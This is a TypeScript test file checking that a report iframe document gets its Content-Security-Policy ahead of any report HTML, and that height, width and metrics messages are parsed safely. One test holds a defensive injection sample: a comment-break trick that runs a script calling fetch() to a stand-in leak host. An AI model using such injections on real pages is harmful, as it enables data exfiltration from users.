import { describe, expect, it } from 'bun:test';

import {
  dayMetricsMessageOf,
  reportContentSecurityPolicy,
  reportDocumentOf,
  reportFrameStyle,
  reportHeightBounds,
  reportHeightOf,
  reportOffersWidthOf,
  reportWidthMessageOf,
  requestedReportWidthOf,
} from './report-document.ts';
import type { DayMetrics } from './schemas/day-metrics.ts';

const preamble = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${reportContentSecurityPolicy}"><style>${reportFrameStyle}</style>`;

describe('reportDocumentOf', () => {
  it('carries the contract policy exactly', () => {
    expect(reportContentSecurityPolicy).toBe(
      "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:",
    );
  });

  it('puts a doctype, the policy and the frame style in front of the whole report', () => {
    for (const report of [
      '<!doctype html><html lang="en"><head></head></html>',
      '\n<!-- made by /wrap -->\n<!DOCTYPE html>\n<p>',
      '<p>A fragment</p>',
    ]) {
      expect(reportDocumentOf(report)).toBe(`${preamble}${report}`);
    }
  });

  it('keeps none of the report ahead of the policy, even a comment that ends early', () => {
    const report =
      '<!--><script>fetch("https://leak.invalid/before-policy",{mode:"no-cors"})</script><!-- --> <!doctype html>';
    expect(reportDocumentOf(report)).toBe(`${preamble}${report}`);
  });

  it('keeps a policy the report sets itself, since both are enforced', () => {
    const own =
      '<!doctype html><head><meta http-equiv="Content-Security-Policy" content="default-src \'none\'"></head>';
    expect(reportDocumentOf(own)).toBe(`${preamble}${own}`);
  });
});

describe('reportHeightOf', () => {
  it('reads a height message and rounds up', () => {
    expect(
      reportHeightOf({ type: 'postlude:report-height', height: 812.2 }),
    ).toBe(813);
  });

  it('keeps the height within its bounds', () => {
    expect(reportHeightOf({ type: 'postlude:report-height', height: 0 })).toBe(
      reportHeightBounds.minimum,
    );
    expect(
      reportHeightOf({ type: 'postlude:report-height', height: 10_000_000 }),
    ).toBe(reportHeightBounds.maximum);
  });

  it('ignores anything that is not a usable height message', () => {
    for (const data of [
      undefined,
      null,
      'postlude:report-height',
      { type: 'postlude:report-height' },
      { type: 'postlude:report-height', height: '900' },
      { type: 'postlude:report-height', height: Number.NaN },
      { type: 'postlude:report-height', height: Number.POSITIVE_INFINITY },
      { type: 'postlude:day-metrics', height: 900 },
    ]) {
      expect(reportHeightOf(data)).toBeUndefined();
    }
  });
});

describe('dayMetricsMessageOf', () => {
  it('builds the message the contract names', () => {
    const dayMetrics = { metricsVersion: 2, day: '2026-10-30' } as DayMetrics;
    expect(dayMetricsMessageOf(dayMetrics, 2, 'dark')).toEqual({
      type: 'postlude:day-metrics',
      metricsVersion: 2,
      dayMetrics,
      theme: 'dark',
    });
  });
});

describe('the width messages', () => {
  it('tells the report its column and whether the frame can be wide, and never that it is wide when it cannot be', () => {
    expect(reportWidthMessageOf(true, true, 660)).toEqual({
      type: 'postlude:report-width',
      available: true,
      wide: true,
      column: 660,
    });
    expect(reportWidthMessageOf(true, false, 660)).toEqual({
      type: 'postlude:report-width',
      available: true,
      wide: false,
      column: 660,
    });
    expect(reportWidthMessageOf(false, true, 341.5)).toEqual({
      type: 'postlude:report-width',
      available: false,
      wide: false,
      column: 341.5,
    });
  });

  it('hears a report say it has a width control, and nothing else as that', () => {
    expect(reportOffersWidthOf({ type: 'postlude:report-width-control' })).toBe(
      true,
    );
    for (const data of [
      undefined,
      null,
      'postlude:report-width-control',
      { type: 'postlude:report-width-request', wide: true },
      { type: 'postlude:report-height', height: 900 },
    ]) {
      expect(reportOffersWidthOf(data)).toBe(false);
    }
  });

  it('reads the width a request asks for', () => {
    expect(
      requestedReportWidthOf({
        type: 'postlude:report-width-request',
        wide: true,
      }),
    ).toBe('wide');
    expect(
      requestedReportWidthOf({
        type: 'postlude:report-width-request',
        wide: false,
      }),
    ).toBe('column');
  });

  it('ignores anything that is not a usable width request', () => {
    for (const data of [
      undefined,
      null,
      'postlude:report-width-request',
      { type: 'postlude:report-width-request' },
      { type: 'postlude:report-width-request', wide: 'true' },
      { type: 'postlude:report-width-request', wide: 1 },
      {
        type: 'postlude:report-width',
        available: true,
        wide: true,
        column: 660,
      },
      { type: 'postlude:report-width-control' },
    ]) {
      expect(requestedReportWidthOf(data)).toBeUndefined();
    }
  });
});
